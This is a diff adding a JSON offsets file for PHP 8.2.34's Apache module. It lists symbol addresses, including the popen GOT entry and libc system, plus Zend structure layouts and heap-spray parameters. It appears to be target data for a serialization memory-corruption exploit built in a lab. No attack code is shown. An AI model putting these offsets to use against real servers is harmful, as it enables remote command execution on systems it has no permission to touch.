@@ -1,0 +1,54 @@
+{
+  "meta": {
+    "php": "8.2.34",
+    "arch": "x86_64",
+    "build": "gcc -g -O2, pristine + [ser]/[lab] instrumentation",
+    "module": "/usr/lib/apache2/modules/libphp.so",
+    "base": "libphp.so load base (first r-xp mapping in /proc/<pid>/maps)"
+  },
+  "symbols": {
+    "zend_eval_string": "0x312380",
+    "zend_eval_string_ex": "0x3124e0",
+    "zend_eval_stringl": "0xdd920 (plt)",
+    "zend_hash_index_add_new": "0x32fe00",
+    "zend_hash_index_add": "0x3302b0",
+    "zend_hash_index_find": "0x335830",
+    "zend_hash_index_update": "0x32e510",
+    "php_var_serialize_init": "0x296e40",
+    "popen_plt": "0xdee60",
+    "popen_got": "0x5e2f18",
+    "system_libc": "0x53090"
+  },
+  "layout": {
+    "sizeof_php_serialize_data": 60,
+    "zend_string": {
+      "gc": 0,
+      "h": 8,
+      "len": 16,
+      "data": 24
+    },
+    "zend_object": {
+      "gc": 0,
+      "handle": 8,
+      "ce": 16,
+      "handlers": 24,
+      "properties": 32
+    },
+    "zend_object_handlers": {
+      "offset": 0,
+      "free_obj": 8,
+      "dtor_obj": 16,
+      "clone_obj": 24,
+      "read_property": 32
+    },
+    "Bucket": {
+      "val": 0,
+      "h": 16,
+      "key": 24,
+      "size": 32
+    },
+    "spray_len": 736,
+    "cover_idx": 1039,
+    "cover_off_craft": 488
+  }
+}
